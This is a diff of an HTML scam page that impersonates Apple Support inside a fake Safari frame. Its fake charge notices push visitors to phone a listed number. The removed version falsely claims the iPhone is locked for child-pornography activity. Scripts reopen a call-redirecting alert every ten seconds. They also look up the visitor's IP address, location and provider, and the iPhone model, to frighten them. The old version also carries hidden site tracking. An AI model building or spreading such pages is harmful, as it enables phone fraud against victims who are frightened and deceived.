@@ -6,205 +6,169 @@
 <title>iPhone UI Demo - Fullscreen</title>
 
 <style>
-    :root {
-        --vh: 100vh;
-    }
+:root { --vh: 100vh; }
 
-    @supports (-webkit-touch-callout: none) {
-        body {
-            height: calc(var(--vh) * 100);
-        }
-    }
+@supports (-webkit-touch-callout: none) {
+    body { height: calc(var(--vh) * 100); }
+}
 
-    /* GLOBAL iOS FONT */
-    body {
-        margin: 0;
-        padding: 0;
-        font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Display", Arial, sans-serif;
-        background: #f2f2f7;
-        height: 100vh;
-        width: 100vw;
-        display: flex;
-        justify-content: center;
-        align-items: flex-start;
-        overflow: hidden;
-        font-size: 17px; /* iOS default */
-    }
+body {
+    margin: 0;
+    padding: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Display", Arial, sans-serif;
+    background: #f2f2f7;
+    height: 100vh;
+    width: 100vw;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    overflow: hidden;
+    font-size: 17px;
+}
 
-    .iphone {
-        width: 100%;
-        height: 100%;
-        max-width: 430px;
-        background: #f2f2f7;
-        overflow-y: auto;
-        -webkit-overflow-scrolling: touch;
-        padding-bottom: env(safe-area-inset-bottom);
-    }
+.iphone {
+    width: 100%;
+    height: 100%;
+    max-width: 430px;
+    background: #f2f2f7;
+    overflow-y: auto;
+    -webkit-overflow-scrolling: touch;
+    padding-bottom: env(safe-area-inset-bottom);
+}
 
-    /* SAFARI BAR */
-    .safari-bar {
-        background: #f2f2f7;
-        padding: 12px;
-        text-align: center;
-        border-bottom: 1px solid #d1d1d6;
-        font-size: 14px; /* Safari label */
-        color: #666;
-        padding-top: env(safe-area-inset-top);
-    }
+.safari-bar {
+    background: #f2f2f7;
+    padding: 12px;
+    text-align: center;
+    border-bottom: 1px solid #d1d1d6;
+    font-size: 14px;
+    color: #666;
+    padding-top: env(safe-area-inset-top);
+}
 
-    .url-box {
-        background: white;
-        border-radius: 10px;
-        padding: 6px 10px;
-        border: 1px solid #ccc;
-        display: inline-block;
-        min-width: 70%;
-        font-size: 13px; /* Safari URL font */
-        font-weight: 400;
-        color: #333;
-    }
+.url-box {
+    background: white;
+    border-radius: 10px;
+    padding: 6px 10px;
+    border: 1px solid #ccc;
+    display: inline-block;
+    min-width: 70%;
+    font-size: 13px;
+    color: #333;
+}
 
-    .content {
-        padding: 22px;
-    }
+.content { padding: 22px; }
 
-    /* SETTINGS CARD */
-    .settings-card {
-        background: #ffffff;
-        border-radius: 16px;
-        overflow: hidden;
-        box-shadow: 0 6px 18px rgba(0,0,0,0.07);
-        border: 1px solid #e5e5e7;
-        margin-top: 10px;
-    }
+.settings-card {
+    background: #fff;
+    border-radius: 16px;
+    overflow: hidden;
+    box-shadow: 0 6px 18px rgba(0,0,0,0.07);
+    border: 1px solid #e5e5e7;
+    margin-top: 10px;
+}
 
-    .settings-header {
-        display: flex;
-        align-items: center;
-        padding: 16px;
-        font-size: 20px; /* Settings title */
-        font-weight: 600;
-        color: #111;
-    }
+.settings-header {
+    display: flex;
+    align-items: center;
+    padding: 16px;
+    font-size: 20px;
+    font-weight: 600;
+}
 
-    .settings-header img {
-        width: 32px;
-        margin-right: 12px;
-    }
+.settings-header img {
+    width: 32px;
+    margin-right: 12px;
+}
 
-    .settings-divider {
-        height: 1px;
-        background: #e5e5ea;
-        width: 100%;
-    }
+.settings-divider { height: 1px; background: #e5e5ea; }
 
-    .settings-body {
-        padding: 16px;
-        font-size: 15px; /* Settings content font */
-        line-height: 1.45;
-        color: #333;
-    }
+.settings-body {
+    padding: 16px;
+    font-size: 15px;
+    line-height: 1.45;
+    color: #333;
+}
 
-    /* BUTTONS */
-    .button-row {
-        margin-top: 18px;
-        display: flex;
-        flex-direction: column;
-        gap: 10px;
-    }
+.button-row {
+    margin-top: 18px;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+}
 
-    .btn {
-        display: block;
-        width: 100%;
-        text-align: center;
-        padding: 14px 0;
-        border-radius: 12px;
-        font-size: 17px;
-        font-weight: 600;
-        text-decoration: none;
-    }
+.btn {
+    width: 100%;
+    text-align: center;
+    padding: 14px 0;
+    border-radius: 12px;
+    font-size: 17px;
+    font-weight: 600;
+    text-decoration: none;
+}
 
-    .cancel-btn {
-        background: #e5e5ea;
-        color: #000;
-    }
+.cancel-btn { background: #e5e5ea; color: #000; }
+.call-btn {
+    background: #007aff;
+    color: white;
+    animation: pulse 1.8s infinite;
+}
 
-    .call-btn {
-        background: #007aff;
-        color: white;
-        animation: pulse 1.8s infinite;
-    }
+@keyframes pulse {
+    0% { box-shadow: 0 0 0 0 rgba(0,122,255,0.45); }
+    70% { box-shadow: 0 0 14px 8px rgba(0,122,255,0); }
+    100% { box-shadow: 0 0 0 0 rgba(0,122,255,0); }
+}
 
-    @keyframes pulse {
-        0% { box-shadow: 0 0 0 0 rgba(0,122,255,0.45); }
-        70% { box-shadow: 0 0 14px 8px rgba(0,122,255,0); }
-        100% { box-shadow: 0 0 0 0 rgba(0,122,255,0); }
-    }
+.disclaimer {
+    font-size: 11px;
+    color: #888;
+    margin-top: 16px;
+    text-align: center;
+}
 
-    /* FOOTNOTE */
-    .disclaimer {
-        font-size: 11px;
-        color: #888;
-        margin-top: 16px;
-        text-align: center;
-    }
+#loopAlertOverlay {
+    display:none;
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,0.35);
+    backdrop-filter:blur(6px);
+    justify-content:center;
+    align-items:center;
+    z-index:9999;
+}
 
-    /* ALERT POPUP */
-    #loopAlertOverlay {
-        display:none;
-        position:fixed;
-        inset:0;
-        background:rgba(0,0,0,0.35);
-        backdrop-filter:blur(6px);
-        justify-content:center;
-        align-items:center;
-        z-index:9999;
-    }
+#loopAlertBox {
+    width:80%;
+    max-width:300px;
+    background:white;
+    border-radius:14px;
+    text-align:center;
+    padding-top:18px;
+    animation:loopPop .25s forwards;
+}
 
-    #loopAlertBox {
-        width:80%;
-        max-width:300px;
-        background:white;
-        border-radius:14px;
-        text-align:center;
-        padding-top:18px;
-        opacity:0;
-        transform:scale(1.1);
-        animation:loopPop .25s forwards;
-    }
+@keyframes loopPop {
+    from { opacity:0; transform:scale(1.12); }
+    to { opacity:1; transform:scale(1); }
+}
 
-    @keyframes loopPop {
-        0% { opacity:0; transform:scale(1.12); }
-        100% { opacity:1; transform:scale(1); }
-    }
-
-    .loop-title {
-        font-size:18px;
-        font-weight:600;
-        margin-bottom:6px;
-    }
-
-    .loop-msg {
-        font-size:14px;
-        padding:0 20px 20px;
-        line-height:1.4;
-    }
-
-    .loop-buttonbar {
-        border-top:1px solid #d0d0d0;
-        display:flex;
-        height:44px;
-    }
-
-    .loop-buttonbar div {
-        flex:1;
-        display:flex;
-        justify-content:center;
-        align-items:center;
-        color:#007aff;
-        font-size:17px;
-        cursor:pointer;
-    }
+.loop-title { font-size:18px; font-weight:600; margin-bottom:6px; }
+.loop-msg { font-size:14px; padding:0 20px 20px; }
+.loop-buttonbar {
+    border-top:1px solid #d0d0d0;
+    display:flex;
+    height:44px;
+}
+.loop-buttonbar div {
+    flex:1;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    color:#007aff;
+    font-size:17px;
+    cursor:pointer;
+}
 </style>
 </head>
 
@@ -212,147 +176,107 @@
 
 <div class="iphone">
 
-    <div class="safari-bar">
-        <span class="url-box">https://support.apple.com</span>
-    </div>
-
-    <div class="content">
-
-        <div class="settings-card">
-            <div class="settings-header">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ea/Settings_%28iOS%29.png/250px-Settings_%28iOS%29.png">
-                Apple Support
-            </div>
-            <div class="settings-divider"></div>
-            <div class="settings-body">
-                Loading your details...
-            </div>
-        </div>
-
-        <div class="button-row">
-            <a href="tel:+1-808-277-4439" class="btn cancel-btn">Cancel</a>
-            <a href="tel:+1-808-277-4439" class="btn call-btn">Call Now</a>
-        </div>
-
-        <div class="disclaimer">
-            Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it.
-        </div>
-
-    </div>
+<div class="safari-bar">
+    <span class="url-box">https://support.apple.com</span>
 </div>
 
-<!-- ALERT POPUP -->
+<div class="content">
+
+<div class="settings-card">
+<div class="settings-header">
+<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ea/Settings_%28iOS%29.png/250px-Settings_%28iOS%29.png">
+Apple Support
+</div>
+<div class="settings-divider"></div>
+<div class="settings-body">Loading your details...</div>
+</div>
+
+<div class="button-row">
+<a href="tel:+1-808-277-4439" class="btn cancel-btn">Cancel</a>
+<a href="tel:+1-808-277-4439" class="btn call-btn">Call Now</a>
+</div>
+
+<div class="disclaimer">
+Your Apple ID was recently used at APPLE STORE for $249.99 via Apple Pay Pre-Authorization.
+</div>
+
+</div>
+</div>
+
 <div id="loopAlertOverlay">
-    <div id="loopAlertBox">
-        <div class="loop-title">Apple Support</div>
-        <div class="loop-msg">Loading...</div>
-        <div class="loop-buttonbar">
-            <div id="loopCloseBtn">OK</div>
-        </div>
-    </div>
+<div id="loopAlertBox">
+<div class="loop-title">Apple Support</div>
+<div class="loop-msg">Loading...</div>
+<div class="loop-buttonbar">
+<div id="loopCloseBtn">OK</div>
+</div>
+</div>
 </div>
 
 <script>
-let loopTimer = null;
+/* iPHONE MODEL DETECTION */
+function detectIPhoneModel() {
+    if (!/iPhone/.test(navigator.userAgent)) return "Not an iPhone";
 
-/* POPUP MESSAGES */
+    const w = Math.min(screen.width, screen.height);
+    const h = Math.max(screen.width, screen.height);
+    const r = window.devicePixelRatio;
+
+    const models = [
+        { w:320, h:568, r:2, name:"iPhone SE (1st gen) / 5 / 5s" },
+        { w:375, h:667, r:2, name:"iPhone 6 / 7 / 8 / SE (2nd & 3rd gen)" },
+        { w:414, h:736, r:3, name:"iPhone Plus models" },
+        { w:375, h:812, r:3, name:"iPhone X / XS / 11 Pro / mini" },
+        { w:414, h:896, r:2, name:"iPhone XR / 11" },
+        { w:414, h:896, r:3, name:"iPhone XS Max / 11 Pro Max" },
+        { w:390, h:844, r:3, name:"iPhone 12 / 13 / 14" },
+        { w:393, h:852, r:3, name:"iPhone 14 Pro / 15 Pro" },
+        { w:428, h:926, r:3, name:"iPhone Pro Max / Plus" },
+        { w:430, h:932, r:3, name:"iPhone 14 Pro Max / 15 Pro Max" }
+    ];
+
+    for (const m of models) {
+        if (w === m.w && h === m.h && r === m.r) return m.name;
+    }
+    return "iPhone (Unknown Model)";
+}
+
+/* ALERT LOOP */
+let loopTimer;
 const alertMessages = [
-    "Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it.",
-    "Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it.",
-    "Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it.",
-    "Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it."
+"Your Apple ID was recently used at APPLE STORE for $249.99. Not you? Call Apple Support immediately."
 ];
-
 let currentIndex = 0;
 
 function showLoopAlert() {
     document.querySelector(".loop-msg").textContent = alertMessages[currentIndex];
-    currentIndex = (currentIndex + 1) % alertMessages.length;
     document.getElementById("loopAlertOverlay").style.display = "flex";
 }
 
 function hideLoopAlertAndCall() {
     document.getElementById("loopAlertOverlay").style.display = "none";
-
-    navigator.vibrate?.([6, 12, 6]);
-
     window.location.href = "tel:+1-808-277-4439";
-
-    clearTimeout(loopTimer);
-
-    loopTimer = setTimeout(showLoopAlert, 10000);
 }
 
 document.getElementById("loopCloseBtn").onclick = hideLoopAlertAndCall;
+window.onload = () => loopTimer = setTimeout(showLoopAlert, 10000);
 
-window.onload = function() {
-    loopTimer = setTimeout(showLoopAlert, 10000);
-};
-
-/* IP + LOCATION + CARRIER */
+/* IP + LOCATION */
 async function detectIPandLocation() {
     try {
         const res = await fetch("https://ipapi.co/json/");
-        const data = await res.json();
-
-        const ip = data.ip;
-        const city = data.city;
-        const region = data.region;
-        const country = data.country_name;
-        const isp = data.org;
-
-        let carrier = "Unknown";
-
-        const carriers = [
-            "Verizon", "AT&T", "T-Mobile", "Sprint", "US Cellular",
-            "Vodafone", "Orange", "O2", "Three", "Rogers", "Telus", "Bell"
-        ];
-
-        for (const c of carriers) {
-            if (isp && isp.toLowerCase().includes(c.toLowerCase())) {
-                carrier = c;
-                break;
-            }
-        }
-
-        if (carrier === "Unknown" && isp) carrier = "WiFi Network";
-
+        const d = await res.json();
         document.querySelector(".settings-body").innerHTML = `
-            <strong>Your IP:</strong> ${ip}<br>
-            <strong>Location:</strong> ${city}, ${region}, ${country}<br>
-            <strong>Network Provider:</strong> ${isp}<br>
-            <strong>Carrier (Detected):</strong> ${carrier}<br><br>
-            Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it.
+            <strong>Your IP:</strong> ${d.ip}<br>
+            <strong>Location:</strong> ${d.city}, ${d.region}, ${d.country_name}<br>
+            <strong>Network Provider:</strong> ${d.org}<br>
+            <strong>Device:</strong> ${detectIPhoneModel()}<br><br>
+            Your Apple ID was recently used at APPLE STORE for $249.99.
         `;
-    } catch (err) {
-        console.error("Location error:", err);
-    }
+    } catch(e) {}
 }
-
-window.addEventListener("load", detectIPandLocation);
-
-function updateVH() {
-    document.documentElement.style.setProperty('--vh', window.innerHeight * 0.01 + 'px');
-}
-window.addEventListener('resize', updateVH);
-updateVH();
+detectIPandLocation();
 </script>
-<!-- Default Statcounter code for mens tshirt
-https://menstshirts.z13.web.core.windows.net/ -->
-<script type="text/javascript">
-var sc_project=13196894; 
-var sc_invisible=1; 
-var sc_security="7cf95a0a"; 
-</script>
-<script type="text/javascript"
-src="https://www.statcounter.com/counter/counter.js"
-async></script>
-<noscript><div class="statcounter"><a title="Web Analytics"
-href="https://statcounter.com/" target="_blank"><img
-class="statcounter"
-src="https://c.statcounter.com/13196894/0/7cf95a0a/1/"
-alt="Web Analytics"
-referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
-<!-- End of Statcounter Code -->
+
 </body>
 </html>
